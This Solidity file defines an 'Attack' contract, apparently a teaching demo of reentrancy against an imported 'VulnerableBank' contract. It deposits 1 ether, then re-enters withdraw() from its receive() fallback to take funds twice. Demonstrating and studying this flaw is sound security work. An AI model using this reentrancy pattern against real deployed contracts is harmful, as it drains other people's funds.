// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public bank;
    uint private count;

    constructor(VulnerableBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        
        bank.deposit{value: 1 ether}();
       
        bank.withdraw();
    }

    receive() external payable {
        if (count < 1 && address(bank).balance >= 1 ether) {
            count++;
            bank.withdraw(); 
        }
    }
}